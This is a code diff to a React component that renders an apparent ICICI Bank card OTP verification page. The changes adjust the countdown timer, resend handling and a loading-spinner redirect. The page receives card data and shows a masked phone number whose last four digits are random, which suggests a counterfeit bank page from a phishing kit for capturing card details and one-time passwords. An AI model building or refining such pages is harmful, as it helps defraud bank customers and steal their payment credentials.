@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import LoadingSpinner from './LoadingSpinner';
 
 interface ICICIOTPPageProps {
   cardData: {
@@ -44,10 +45,11 @@ const ICICIOTPPage: React.FC<ICICIOTPPageProps> = ({
 }) => {
   // Loading state
   const [isLoading, setIsLoading] = useState(true);
-  
-  const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
   const [resendCount, setResendCount] = useState(0);
+  const [canResend, setCanResend] = useState(false);
   const [resendCooldown, setResendCooldown] = useState(false);
+  const [timeLeft, setTimeLeft] = useState(180); // 3:00 in seconds
+  const [redirectLoading, setRedirectLoading] = useState(false);
   const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
   const [showResendSuccess, setShowResendSuccess] = useState(false);
 
@@ -59,13 +61,31 @@ const ICICIOTPPage: React.FC<ICICIOTPPageProps> = ({
     return () => clearTimeout(loadingTimer);
   }, []);
 
+  const handleCancel = () => {
+    setRedirectLoading(true);
+    // Show loading spinner for 3.5 seconds before redirecting
+    setTimeout(() => {
+      handleOtpCancel();
+    }, 3500);
+  };
+
+  // Handle timer expiry
+  useEffect(() => {
+    if (timeLeft === 0 && !redirectLoading) {
+      setRedirectLoading(true);
+      setTimeout(() => {
+        handleOtpCancel();
+      }, 3500);
+    }
+  }, [timeLeft, handleOtpCancel, redirectLoading]);
+
   // Timer countdown effect
   useEffect(() => {
     const timer = setInterval(() => {
-      setTimeLeft((prev) => {
+      setTimeLeft(prev => {
         if (prev <= 1) {
           clearInterval(timer);
-          window.location.href = '/payment-failed?error=timeout';
+          handleCancel();
           return 0;
         }
         return prev - 1;
@@ -73,14 +93,19 @@ const ICICIOTPPage: React.FC<ICICIOTPPageProps> = ({
     }, 1000);
 
     return () => clearInterval(timer);
-  }, []);
+  }, [handleOtpCancel]);
 
   // Format timer to MM:SS
   const formatTimer = (seconds: number) => {
-    const minutes = Math.floor(seconds / 60);
-    const remainingSeconds = seconds % 60;
-    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
+
+  // Show loading spinner during redirect only
+  if (redirectLoading) {
+    return <LoadingSpinner />;
+  }
 
   // Handle resend OTP
   const handleResendOtp = () => {
@@ -95,7 +120,7 @@ const ICICIOTPPage: React.FC<ICICIOTPPageProps> = ({
     setResendCount(prev => prev + 1);
     setResendCooldown(true);
     setShowResendSuccess(true);
-    setTimeLeft(179); // Reset timer to 2:59
+    setTimeLeft(180); // Reset timer to 3:00
 
     // Hide success message after 3 seconds
     setTimeout(() => {
